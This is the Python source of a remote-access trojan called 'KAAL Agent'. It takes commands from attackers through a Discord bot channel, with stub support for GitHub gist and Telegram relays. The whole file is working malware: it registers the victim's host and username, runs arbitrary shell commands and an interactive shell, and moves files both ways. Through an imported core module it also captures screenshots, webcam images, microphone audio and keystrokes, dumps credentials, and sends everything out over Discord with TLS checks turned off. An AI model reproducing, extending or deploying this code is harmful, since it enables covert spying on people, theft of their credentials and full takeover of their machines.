"""
KAAL Agent – Professional Grade (Phase 1 Enhanced)
Features:
- Full integration with `agent_core` module
- Structured JSON output for all commands
- Multi-Relay support (Discord/Telegram/GitHub)
- Robust error handling and configuration
"""

import time
import platform
import json
import logging
from logging.handlers import RotatingFileHandler
import urllib.request
import urllib.parse
import ssl
import os
import sys
import subprocess
import base64
import threading
import ctypes
import uuid
import socket

# Try to import core features; if missing, some cmds will fail gracefully
try:
    from agent_core import (
        get_real_screenshot, get_real_location,
        list_directory_json, get_process_list_struct,
        get_system_info_struct, get_network_config_struct,
        ping_host_struct, dump_credentials,
        record_audio, start_keylogger, stop_keylogger, 
        get_keylogs, list_directory, KEYLOGGER_ACTIVE, KEYLOGS
    )
    CORE_AVAILABLE = True
except ImportError:
    CORE_AVAILABLE = False
    print("[-] Warning: agent_core.py not found. Some features will be limited.")

# ==================== CONFIGURATION & STATE ====================
CURRENT_RELAY_TYPE = "discord"
RELAY_CONFIG = {
    "github": {
        "token": "YOUR_GITHUB_PAT_HERE",
        "gist_id": "f7469bd497be819b3fe1485aa5b48ce9"
    },
    "telegram": {
        "token": "",
        "chat_id": ""
    },
    "discord": {
        "token": "YOUR_DISCORD_BOT_TOKEN_HERE",
        "channel_id": "1471272917403697248"
    }
}
AGENT_ID = f"vm-agent-{platform.node()}-{uuid.uuid4().hex[:8]}"
HEARTBEAT_SEC = 30
POLL_SEC = 5
BURST_UNTIL = 0
CURRENT_CWD = os.getcwd()

# SSL context
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE

def trigger_burst(duration=30):
    global BURST_UNTIL
    BURST_UNTIL = time.time() + duration

def is_burst_mode():
    return time.time() < BURST_UNTIL

# ==================== RATE LIMITER ====================
class RateLimiter:
    def __init__(self, max_tokens=60, refill_rate=1.0):
        """
        Token Bucket Rate Limiter.
        max_tokens: Maximum burst size.
        refill_rate: Tokens per second.
        """
        self.capacity = max_tokens
        self.tokens = max_tokens
        self.rate = refill_rate
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        new_tokens = elapsed * self.rate
        if new_tokens > 0:
            self.tokens = min(self.capacity, self.tokens + new_tokens)
            self.last_refill = now

    def try_acquire(self, tokens=1):
        with self.lock:
            self._refill()
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

    def wait_for_token(self, tokens=1):
        while True:
            with self.lock:
                self._refill()
                if self.tokens >= tokens:
                    self.tokens -= tokens
                    return
                # Calculate wait time
                needed = tokens - self.tokens
                wait_time = needed / self.rate
            
            time.sleep(min(wait_time, 1.0))


# ==================== CONFIG FRAMEWORK ====================
def load_config():
    global HEARTBEAT_SEC, POLL_SEC, RELAY_CONFIG, CURRENT_RELAY_TYPE
    config_path = "agent_config.json"
    
    if os.path.exists(config_path):
        try:
            with open(config_path, "r") as f:
                config = json.load(f)
                
            logger.info(f"Loading configuration from {config_path}")
            
            # Update globals if present in config
            if "heartbeat_sec" in config: HEARTBEAT_SEC = config["heartbeat_sec"]
            if "poll_sec" in config: POLL_SEC = config["poll_sec"]
            if "relay_type" in config: CURRENT_RELAY_TYPE = config["relay_type"]
            
            # Deep merge relay config
            if "relay_config" in config:
                for r_type, r_data in config["relay_config"].items():
                    if r_type in RELAY_CONFIG:
                        RELAY_CONFIG[r_type].update(r_data)
                    else:
                        RELAY_CONFIG[r_type] = r_data
                        
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
    else:
        logger.info("No config file found. Using internal defaults.")

# ==================== RELAY ABSTRACTION ====================
class RelayBase:
    def send_registration(self): pass
    def send_heartbeat(self): pass
    def poll_commands(self): return []
    def send_ack(self, task_id): pass
    def send_status(self, task_id, status, msg=""): pass
    def send_result(self, task_id, result): pass
    def send_log(self, level, message): pass

class DiscordRelay(RelayBase):
    def __init__(self, config):
        self.token = config.get("token")
        self.channel_id = config.get("channel_id")
        self.webhook_url = config.get("webhook_url")
        self.last_msg_id = None
        self.ua = "KAAL-DiscordC2/1.0"
        # 60 requests/min = 1 req/sec. Burst 10.
        self.limiter = RateLimiter(max_tokens=10, refill_rate=1.0)
        
    def _api(self, method, endpoint, data=None, use_webhook=False):
        # WAIT for rate limit token before every request
        # For critical ops, we wait. For polling, we might skip, but let's enforce hygiene.
        self.limiter.wait_for_token()

        if use_webhook and self.webhook_url:
            url = self.webhook_url
            headers = {"Content-Type": "application/json", "User-Agent": self.ua}
        else:
            url = f"https://discord.com/api/v10/{endpoint}"
            headers = {
                "Authorization": f"Bot {self.token}",
                "Content-Type": "application/json",
                "User-Agent": self.ua
            }
        
        # Exponential Backoff for 429/Errors
        base_delay = 2
        max_delay = 60
        
        for attempt in range(5):
            try:
                if data:
                    req_data = json.dumps(data).encode()
                    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
                else:
                    req = urllib.request.Request(url, headers=headers, method=method)
                
                with urllib.request.urlopen(req, timeout=10, context=_ctx) as r:
                    return json.loads(r.read().decode())
            
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    try:
                        retry_after = json.loads(e.read().decode()).get("retry_after", base_delay)
                        logger.warning(f"Rate Limited (429). Sleeping {retry_after}s...")
                        time.sleep(retry_after)
                        continue # Retry immediately after sleep
                    except: 
                        pass
                
                # Other errors
                delay = min(max_delay, base_delay * (2 ** attempt))
                # print(f"[-] HTTP Error {e.code}. Retrying in {delay}s...")
                time.sleep(delay)
            
            except Exception as e:
                delay = min(max_delay, base_delay * (2 ** attempt))
                time.sleep(delay)
                
        return None

    def _encode(self, data):
        """Mythic-style encoding: base64(agent_id + : + json)"""
        try:
            payload = json.dumps(data)
            combined = f"{AGENT_ID}:{payload}"
            return base64.b64encode(combined.encode()).decode()
        except: return ""

    def _decode(self, encoded):
        try:
            decoded = base64.b64decode(encoded).decode()
            if ":" not in decoded: return None
            aid, payload = decoded.split(":", 1)
            if aid == AGENT_ID:
                return json.loads(payload)
            return None
        except: return None

    def send_registration(self):
        msg = {
            "type": "register",
            "agent_id": AGENT_ID,
            "platform": platform.system().lower(),
            "hostname": platform.node(),
            "timestamp": time.time(),
            "architecture": platform.machine(),
            "username": os.environ.get("USERNAME", "unknown"),
            "pid": os.getpid()
        }
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"})

    def send_heartbeat(self):
        msg = {"type": "heartbeat", "agent_id": AGENT_ID, "timestamp": time.time()}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
        logger.debug(f"[♥] (Discord C2)")

    def poll_commands(self):
        endpoint = f"channels/{self.channel_id}/messages?limit=10"
        if self.last_msg_id: endpoint += f"&after={self.last_msg_id}"
        
        res = self._api("GET", endpoint)
        cmds = []
        
        if res and isinstance(res, list):
            try:
                res.sort(key=lambda x: int(x["id"]))
                if res: self.last_msg_id = res[-1]["id"]
                
                for m in res:
                    content = m.get("content", "")
                    if content.startswith("KAAL_SVR:"):
                        try:
                            payload = self._decode(content[9:])
                            if not payload: continue
                            
                            p_type = payload.get("type")
                            print(f"[DEBUG] Decoded payload type: {p_type}")
                            
                            # --- Adopt Per-Agent Channel Dynamically ---
                            if p_type == "registered" and "transport_id" in payload:
                                new_channel = payload.get("transport_id")
                                new_webhook = payload.get("webhook_url")
                                print(f"[DEBUG] Server says adopt new channel: {new_channel} | webhook: {new_webhook}")
                                
                                updated_config = False
                                if new_webhook and new_webhook != self.webhook_url:
                                    logger.info("Adopted dedicated webhook for telemetry!")
                                    self.webhook_url = new_webhook
                                    updated_config = True

                                if new_channel and new_channel != self.channel_id:
                                    logger.info(f"Adopted per-agent channel: {new_channel}")
                                    self.channel_id = new_channel
                                    self.last_msg_id = None # Reset pointer for new channel
                                    updated_config = True

                                if updated_config:
                                    try:
                                        with open("agent_config.json", "r+") as f:
                                            cfg = json.load(f)
                                            if "relay_config" in cfg and "discord" in cfg["relay_config"]:
                                                cfg["relay_config"]["discord"]["channel_id"] = self.channel_id
                                                if self.webhook_url:
                                                    cfg["relay_config"]["discord"]["webhook_url"] = self.webhook_url
                                                f.seek(0)
                                                json.dump(cfg, f, indent=4)
                                                f.truncate()
                                    except: pass
                                    # Break to start polling the new channel instead of continuing here
                                    break 
                                    
                            elif p_type == "command":
                                tid = payload.get("task_id")
                                cmd = payload.get("command")
                                cmds.append((tid, cmd))
                        except Exception as e: 
                            pass
            except Exception: pass
        return cmds

    def _upload_large(self, encoded_payload, use_webhook=True):
        # Respect rate limit for large uploads too
        self.limiter.wait_for_token()

        boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
        filename = "response.txt"
        file_content = f"KAAL_AGT:{encoded_payload}".encode()
        
        body = []
        body.append(f'--{boundary}'.encode())
        body.append(f'Content-Disposition: form-data; name="files[0]"; filename="{filename}"'.encode())
        body.append('Content-Type: text/plain'.encode())
        body.append(b'')
        body.append(file_content)
        body.append(f'--{boundary}--'.encode())
        body.append(b'')
        
        payload = b'\r\n'.join(body)
        if use_webhook and self.webhook_url:
            url = self.webhook_url
            headers = {
                "User-Agent": self.ua,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(payload))
            }
        else:
            url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages"
            headers = {
                "Authorization": f"Bot {self.token}",
                "User-Agent": self.ua,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(payload))
            }
        
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=60, context=_ctx): return True
        except: return False

    def send_result(self, task_id, result):
        # Result might be a dictionary now, serialize it for size checking
        if isinstance(result, dict):
            result_str = json.dumps(result)
        else:
            result_str = str(result)
            
        # CHUNK_SIZE = 512KB for reliability over Discord attachments
        CHUNK_SIZE = 512 * 1024 
        
        if len(result_str) > CHUNK_SIZE:
            stream_id = uuid.uuid4().hex
            total_chunks = (len(result_str) + CHUNK_SIZE - 1) // CHUNK_SIZE
            logger.info(f"Result too large ({len(result_str)} bytes). Splitting into {total_chunks} chunks (Stream {stream_id})...")
            
            for index in range(total_chunks):
                self.limiter.wait_for_token()
                chunk_data = result_str[index * CHUNK_SIZE : (index + 1) * CHUNK_SIZE]
                
                msg = {
                    "type": "chunk",
                    "agent_id": AGENT_ID,
                    "task_id": task_id,
                    "stream_id": stream_id,
                    "index": index,
                    "total": total_chunks,
                    "data": chunk_data, # This is the payload to reassemble
                    "timestamp": time.time()
                }
                encoded = self._encode(msg)
                
                # Each chunk is sent as a separate message. 
                # If chunk > 1800 chars (likely), _upload_large handles it as attachment.
                if len(encoded) > 1800:
                     self._upload_large(encoded)
                else:
                    self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)
                    
            logger.info(f"Stream {stream_id} complete.")
            return

        # --- Standard Result ---
        msg = {
            "type": "result",
            "agent_id": AGENT_ID,
            "task_id": task_id,
            "result": result, # This will be stringified JSON
            "timestamp": time.time()
        }
        encoded = self._encode(msg)
        
        if len(encoded) > 1800:
             logger.info(f"Result too large ({len(encoded)} bytes). Uploading as attachment...")
             self._upload_large(encoded)
             return

        for attempt in range(3):
            self.limiter.wait_for_token()
            if self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True):
                return
            time.sleep(2)

    def send_ack(self, task_id):
        msg = {"type": "ack", "agent_id": AGENT_ID, "task_id": task_id}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)

    def send_status(self, task_id, status, message=""):
        msg = {"type": "status", "agent_id": AGENT_ID, "task_id": task_id, "status": status, "message": message}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)

    def send_log(self, level, message):
        msg = {"type": "log", "agent_id": AGENT_ID, "level": level, "message": message, "timestamp": time.time()}
        encoded = self._encode(msg)
        self._api("POST", f"channels/{self.channel_id}/messages", {"content": f"KAAL_AGT:{encoded}"}, use_webhook=True)

# Global instance
relay_system = None
def get_relay():
    global relay_system
    if not relay_system:
        # Default to Discord for now as per config
        relay_system = DiscordRelay(RELAY_CONFIG["discord"])
    return relay_system

# ==================== LOGGING ====================
logger = logging.getLogger("KAAL_AGENT")

class C2LogHandler(logging.Handler):
    def emit(self, record):
        try:
            msg = self.format(record)
            if relay_system:
                relay_system.send_log(record.levelname, msg)
        except Exception:
            self.handleError(record)

def setup_logging():
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Console
    ch = logging.StreamHandler()
    ch.setFormatter(formatter)
    logger.addHandler(ch)
    
    # File
    try:
        fh = RotatingFileHandler("agent.log", maxBytes=1024*1024, backupCount=1)
        fh.setFormatter(formatter)
        logger.addHandler(fh)
    except Exception:
        pass
        
    # C2 Handler (Only for ERROR and above to avoid spam)
    c2h = C2LogHandler()
    c2h.setLevel(logging.ERROR)
    c2h.setFormatter(formatter)
    logger.addHandler(c2h)

# ==================== INTERACTIVE SHELL ====================
class ShellManager:
    def __init__(self):
        self.process = None
        self.output_buffer = [] # List of strings
        self.lock = threading.Lock()
        self.active = False
        
    def start(self):
        if self.active: return
        
        shell_cmd = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"
        try:
            self.process = subprocess.Popen(
                shell_cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                bufsize=0 # Unbuffered
            )
            self.active = True
            
            # Start reader threads
            t_out = threading.Thread(target=self._read_loop, args=(self.process.stdout,), daemon=True)
            t_err = threading.Thread(target=self._read_loop, args=(self.process.stderr,), daemon=True)
            t_out.start()
            t_err.start()
            
            logger.info("Interactive shell started")
        except Exception as e:
            logger.error(f"Shell start failed: {e}")

    def _read_loop(self, pipe):
        while self.active and self.process:
            try:
                # Read char by char or line by line? Char is better for prompts.
                # But blocking read(1) might hang. 
                # Let's read 1 byte
                char = pipe.read(1)
                if not char: break
                
                try:
                    decoded = char.decode(errors='ignore')
                except: continue
                
                with self.lock:
                    self.output_buffer.append(decoded)
            except: break
    
    def write(self, cmd):
        if not self.active or not self.process: return
        try:
            input_data = (cmd + "\n").encode()
            self.process.stdin.write(input_data)
            self.process.stdin.flush()
        except Exception as e:
            logger.error(f"Shell write error: {e}")
            self.close()

    def read(self):
        with self.lock:
            if not self.output_buffer: return ""
            data = "".join(self.output_buffer)
            self.output_buffer.clear()
            return data

    def close(self):
        self.active = False
        if self.process:
            try: self.process.terminate()
            except: pass
            self.process = None

SHELL_SESSION = ShellManager()

# Wrapper functions
def send_ack(task_id): get_relay().send_ack(task_id)
def send_status(tid, s, m=""): get_relay().send_status(tid, s, m)
def send_result(tid, r): 
    get_relay().send_result(tid, r)
    trigger_burst(30) # Phase 4 preview: burst mode

# ==================== COMMAND EXECUTION ====================
def execute_command(cmd_line):
    """
    Execute command and return result dictionary.
    """
    global CURRENT_CWD
    logger.debug(f"Executing: type={type(cmd_line)} value={cmd_line}")
    if isinstance(cmd_line, dict):
        logger.error(f"Received dict instead of string: {cmd_line}")
        # Try to extract 'command' string if it's nested
        cmd_line = cmd_line.get("command", str(cmd_line))
        
    cmd_line = cmd_line.strip()
    if cmd_line.lower().startswith("exec "): cmd_line = cmd_line[5:].strip()
    
    parts = cmd_line.split()
    if not parts: return {"type": "text", "data": ""}
    cmd = parts[0].lower()
    args = parts[1:]

    # Helper for JSON responses
    def ret_json(type_str, data_dict):
        return {"type": type_str, **data_dict}

    # --- Phase 1: Structured Commands ---
    if cmd == "file_list" or cmd == "ls":
        path = args[0] if args else "."
        if CORE_AVAILABLE:
            data = list_directory_json(path)
            if "error" in data: return ret_json("text", {"data": data["error"]})
            return json.dumps({"type": "file_list", **data}) # data has 'path' and 'files'
        else:
            return ret_json("text", {"data": "Core not available"})

    elif cmd == "process_list" or cmd == "ps":
        if CORE_AVAILABLE:
            return ret_json("process_list", {"processes": get_process_list_struct()})
        else:
            return ret_json("text", {"data": "Core not available"})

    elif cmd == "system_info" or cmd == "sysinfo":
        if CORE_AVAILABLE:
            return ret_json("system_info", {"info": get_system_info_struct()})
        else:
             return ret_json("text", {"data": str(platform.uname())})

    elif cmd == "ipconfig" or cmd == "ifconfig":
        if CORE_AVAILABLE:
            return ret_json("text", {"data": get_network_config_struct()})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "ping":
        host = args[0] if args else "8.8.8.8"
        if CORE_AVAILABLE:
            return ret_json("text", {"data": ping_host_struct(host)})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "screenshot":
        if CORE_AVAILABLE:
            return ret_json("screenshot", {"data": get_real_screenshot()})
        else:
             return ret_json("text", {"data": "Core not available"})
    
    elif cmd == "webcam":
        if CORE_AVAILABLE:
            # Re-use screen logic if webcam not distinct in core yet, or use core's stream logic
            # For now, let's assume get_real_screenshot as placeholder if get_real_webcam missing
            try:
                from agent_core import get_real_webcam
                return ret_json("webcam", {"data": get_real_webcam(0)})
            except:
                # If get_real_webcam is missing from imports but cv2 exists in core
                return ret_json("webcam", {"data": get_real_screenshot(), "note": "webcam fallback"}) 
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "mic_record":
        seconds = int(args[0]) if args else 5
        if CORE_AVAILABLE:
             res = record_audio(seconds)
             if res.startswith("[AUDIO] "):
                 return ret_json("audio", {"data": res[8:]})
             else:
                 return ret_json("text", {"data": res})
        else:
             return ret_json("text", {"data": "Core not available"})
             
    elif cmd == "keylog_start":
        if CORE_AVAILABLE:
            if platform.system() == "Windows":
                 t = threading.Thread(target=start_keylogger, args=(lambda t,r: send_result(t,r),), daemon=True) 
                 t.start()
                 return ret_json("status", {"message": "Keylogger started"})
            else:
                 return ret_json("status", {"message": "Keylogger Windows only"})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "keylog_dump":
        if CORE_AVAILABLE:
            return ret_json("keylogs", {"logs": KEYLOGS})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "location":
        if CORE_AVAILABLE:
            return ret_json("location", {"data": get_real_location()})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "creds" or cmd == "cred_audit":
        if CORE_AVAILABLE:
             res = dump_credentials()
             return ret_json("text", {"data": res})
        else:
             return ret_json("text", {"data": "Core not available"})

    elif cmd == "cd":
        if args:
            target = " ".join(args)
            try:
                os.chdir(target)
                CURRENT_CWD = os.getcwd()
                return ret_json("text", {"data": f"Changed to {CURRENT_CWD}"})
            except Exception as e:
                return ret_json("text", {"data": f"Error: {e}"})
        return ret_json("text", {"data": CURRENT_CWD})

    elif cmd == "upload":
         if len(args) < 2: return ret_json("text", {"data": "Usage: upload <filename> <base64>"})
         try:
             with open(os.path.join(CURRENT_CWD, args[0]), "wb") as f:
                 f.write(base64.b64decode(args[1]))
             return ret_json("text", {"data": f"Uploaded {args[0]}"})
         except Exception as e:
             return ret_json("text", {"data": f"Error: {e}"})

    elif cmd == "download":
         if not args: return ret_json("text", {"data": "Usage: download <filename>"})
         try:
             with open(os.path.join(CURRENT_CWD, args[0]), "rb") as f:
                 b64 = base64.b64encode(f.read()).decode()
             return ret_json("download", {"filename": args[0], "data": b64})
         except Exception as e:
             return ret_json("text", {"data": f"Error: {e}"})

    elif cmd == "make_file":
         if not args: return ret_json("text", {"data": "Usage: make_file <path>"})
         try:
             path = args[0]
             # Support absolute paths; otherwise prefix with CWD
             if not os.path.isabs(path):
                 path = os.path.join(CURRENT_CWD, path)
             # Create parent dirs if needed, then touch the file
             os.makedirs(os.path.dirname(path) if os.path.dirname(path) else CURRENT_CWD, exist_ok=True)
             with open(path, "ab"):
                 pass
             return ret_json("text", {"data": f"File created: {path}"})
         except Exception as e:
             return ret_json("text", {"data": f"Error: {e}"})

    # --- Interactive Shell Commands ---
    elif cmd == "shell_start":
        SHELL_SESSION.start()
        return ret_json("text", {"data": "Interactive shell session started."})
    
    elif cmd == "shell_input":
        if not args: return ret_json("text", {"data": "Usage: shell_input <cmd>"})
        input_cmd = " ".join(args)
        SHELL_SESSION.write(input_cmd)
        # We don't return the result immediately; the poll loop handles it.
        # But we confirm the input was sent.
        return ret_json("text", {"data": f"Sent input: {input_cmd}"})

    elif cmd == "shell_stop":
        SHELL_SESSION.close()
        return ret_json("text", {"data": "Interactive shell session closed."})

    # --- Fallback: Shell Execution ---
    shell_cmd = cmd_line
    if platform.system().lower() == "windows":
        aliases = {
            "ls": "dir", "clear": "cls", "cp": "copy", "mv": "move", "rm": "del",
            "cat": "type", "grep": "findstr", "whoami": "whoami"
        }
        if cmd in aliases and not CORE_AVAILABLE: 
            # Only use aliases if core command failed or not found? 
            # Actually, ls/ps already handled above. This is for other aliases.
            shell_cmd = aliases[cmd] + " " + " ".join(args)

    try:
        proc = subprocess.Popen(shell_cmd, shell=True, cwd=CURRENT_CWD, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=30)
        output = (stdout + stderr).decode(errors='ignore')
        if not output.strip(): output = "(No output)"
        return ret_json("text", {"data": output + f"\n\n{CURRENT_CWD}>"})
    except Exception as e:
        return ret_json("text", {"data": f"Execution Error: {e}"})

def main():
    setup_logging()
    load_config()
    logger.info("Agent started.")
    
    relay = get_relay()
    relay.send_registration()
    
    while True:
        try:
            tasks = relay.poll_commands()
            for tid, cmd in tasks:
                # Phase 2: Ack
                relay.send_ack(tid)
                
                # Execute
                result_json = execute_command(cmd)
                
                # Result
                relay.send_result(tid, result_json)
            
            # --- Interactive Shell Output Poll ---
            shell_out = SHELL_SESSION.read()
            if shell_out:
                # Send as a special result or status? 
                # Let's send as a "result" but with a special task_id or type?
                # Actually, our protocol allows "result" msg. 
                # Let's generate a temporary task_id for this output chunk.
                out_tid = f"shell-{uuid.uuid4().hex[:8]}"
                
                # Construct JSON. We want the frontend to recognize this.
                # Let's use send_result with a dict that has type="shell_output"
                output_dict = {"type": "shell_output", "data": shell_out}
                relay.send_result(out_tid, output_dict)
                
            time.sleep(1 if is_burst_mode() else POLL_SEC)
        except KeyboardInterrupt: break
        except Exception as e:
            logger.error(f"Loop error: {e}")
            time.sleep(POLL_SEC)

if __name__ == "__main__":
    main()
